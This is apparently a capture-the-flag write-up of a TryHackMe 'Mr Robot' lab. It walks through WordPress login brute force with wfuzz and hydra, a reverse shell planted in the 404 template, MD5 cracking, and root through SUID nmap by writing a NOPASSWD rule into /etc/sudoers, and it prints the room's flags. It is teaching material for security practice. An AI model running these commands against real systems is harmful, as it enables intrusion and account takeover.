---
layout: single
title: Mr Robot - TryHackMe
excerpt: "Mr Robot is a quick and fun Medium CTF for beginners where we have to use a dictionary to find the password and log in to the service with a character of Mr Robot after that we have to modify the 404 template to win access to the machine for root we will abuse SUID privileges"
date: 2023-02-07
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/try-writeup-mrrobot/iconxd.jpeg
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
tags:  
  - Brute Force
  - WordPress
  - SUID
---
![](/assets/images/try-writeup-mrrobot/icon2.jpg)

Mr Robot is a quick and fun Medium CTF for beginners where we have to use a dictionary to find the password and log in to the service with a character of Mr Robot after that we have to modify the 404 template to win access to the machine for root we will abuse SUID privileges


## PortScan

```
❯ nmap -sCV -p80,443 10.10.81.190 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-06 19:32 CST
sendto in send_ip_packet_sd: sendto(6, packet, 40, 0, 10.10.81.190, 16) => Operation not permitted
Offending packet: ICMP [10.18.12.205 > 10.10.81.190 Timestamp request (type=13/code=0) id=25086 seq=0 orig=0 recv=0 trans=0] IP [ttl=38 id=44441 iplen=40 ]
Nmap scan report for 10.10.81.190
Host is up (0.23s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.97 seconds
```

```
❯ whatweb http://10.10.81.190
http://10.10.81.190 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.178.146], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]
```

This is the webpage 

![](/assets/images/try-writeup-mrrobot/web1.png)

## Enumeration

We're going to use Gobuster to discover routes

```
❯ gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 10 -u http://10.10.81.190
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.81.190
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/06 19:35:51 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 235] [--> http://10.10.81.190/images/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.81.190/js/]    
/admin                (Status: 301) [Size: 234] [--> http://10.10.81.190/admin/] 
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.81.190/wp-content/]
/css                  (Status: 301) [Size: 232] [--> http://10.10.81.190/css/]       
/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.81.190/wp-admin/]  
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.81.190/wp-includes/]
/xmlrpc               (Status: 405) [Size: 42]                                        
/login                (Status: 302) [Size: 0] [--> http://10.10.81.190/wp-login.php]  
/blog                 (Status: 301) [Size: 233] [--> http://10.10.81.190/blog/]       
/feed                 (Status: 301) [Size: 0] [--> http://10.10.81.190/feed/]         
/rss                  (Status: 301) [Size: 0] [--> http://10.10.81.190/feed/]         
/video                (Status: 301) [Size: 234] [--> http://10.10.81.190/video/]      
/sitemap              (Status: 200) [Size: 0]                                         
/image                (Status: 301) [Size: 0] [--> http://10.10.81.190/image/]        
/audio                (Status: 301) [Size: 234] [--> http://10.10.81.190/audio/]      
/phpmyadmin           (Status: 403) [Size: 94]                                        
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.81.190/wp-admin/]     
/wp-login             (Status: 200) [Size: 2664]                                      
/0                    (Status: 301) [Size: 0] [--> http://10.10.81.190/0/]            
/atom                 (Status: 301) [Size: 0] [--> http://10.10.81.190/feed/atom/]    
/robots               (Status: 200) [Size: 41]                                        
/license              (Status: 200) [Size: 309]                                       
/intro                (Status: 200) [Size: 516314]   
```

Only focus on the 200 status codes also wordpress is running but in that route we see files  

```
❯ curl 10.10.81.190/robots
User-agent: *
fsocity.dic
key-1-of-3.txt
```

We're going to download them

```
❯ wget http://10.10.81.190/fsocity.dic
```

The file is big

```
❯ wc -l fsocity.dic
858160 fsocity.dic
```

## First Key

```
❯ wget http://10.10.81.190/key-1-of-3.txt
❯ /bin/cat key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

## Brute Force

This is the Login Panel `wp-login`

![](/assets/images/try-writeup-mrrobot/login.png)

We don't have any users but We can try with characters of Mr Robot

```
Elliot
Angela
Darlene
Tyrell
```

This characters are important 

![](/assets/images/try-writeup-mrrobot/images.jpeg)

After trying Elliot works

![](/assets/images/try-writeup-mrrobot/works.png)

Now we have a `.dic` we can try brute force to discover the password

```
❯ wfuzz -c --hw=194 -w ./fsocity.dic -u http://10.10.81.190/wp-login.php/ -d "log=elliot&pwd=FUZZ&wq-submit=Log In&redirect_to=http://10.10.81.190/wq-admin/&testcookie=" -H "Cookie: wordpress_test_cookie=WP Cookie check" -t 500 --hl 59
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.81.190/wp-login.php/
Total requests: 858160

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000858151:   302        0 L      0 W        0 Ch        "ER28-0652"
```

Another way 

```
❯ hydra -l Elliot -P fsocity.dic 10.10.81.190 http-post-form "/wp-login.php:log=^USER^&pwd=^pwd^:The password you entered for the username" -t 30
```

`elliot:ER28-0652`

The password is correct

![](/assets/images/try-writeup-mrrobot/ok.png)

Now go here 

![](/assets/images/try-writeup-mrrobot/casi.png)

This Template works when you cause an error then as you are instructing it to send you a reverse shell when you cause an error that is what it will do after that click on the button `Update File` to save the modify template

![](/assets/images/try-writeup-mrrobot/404.png)

![](/assets/images/try-writeup-mrrobot/save.png)

## Reverse Shell

Error because don't exist 

```
❯ curl 10.10.81.190/404jsjsj
```

```python
❯ pwncat-cs -lp 443
/opt/pwncat/lib/python3.9/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
  'class': algorithms.Blowfish,
[20:03:28] Welcome to pwncat 🐈!                                                                                 __main__.py:164
[20:05:31] received connection from 10.10.81.190:45677                                                                bind.py:84
[20:05:36] 0.0.0.0:443: normalizing shell path                                                                    manager.py:957
[20:05:40] 10.10.81.190:45677: registered new host w/ db                                                          manager.py:957
(local) pwncat$ back
(remote) daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
(remote) daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ hostname -I                                                          
10.10.81.190 
(remote) daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ bash                                                                 
daemon@linux:/opt/bitnami/apps/wordpress/htdocs$
```

There is a hash

```
daemon@linux:/home/robot$ cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Use john to crack it

```
❯ john -w:/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Loaded 1 password hash (Raw-MD5 [MD5 128/128 XOP 4x2])
abcdefghijklmnopqrstuvwxyz (robot)
Session completed
```

`robot:abcdefghijklmnopqrstuvwxyz`

## Key 2
```
robot@linux:~$ cat key-2-of-3.txt 
822c73956184f694993bede3eb39f959
```

## Root

```java
robot@linux:~$ find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
robot@linux:~$      
```

Go to Gtfobins

- [https://gtfobins.github.io/gtfobins/nmap/](https://gtfobins.github.io/gtfobins/nmap/)


```java
robot@linux:~$ nmap --interactive  

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
waiting to reap child : No child processes
nmap> !sudo su
root@linux:/home/robot# cd
root@linux:~# id
uid=0(root) gid=0(root) groups=0(root)
root@linux:~# hostname -I
10.10.81.190
```

## Key 3
```java
root@linux:~# cat key-3-of-3.txt 
04787ddef27c3dee1ee161b21670b4e4
root@linux:~# 
```

![/assets/images/try-writeup-mrrobot/final.jpg](/assets/images/try-writeup-mrrobot/final.jpg)














































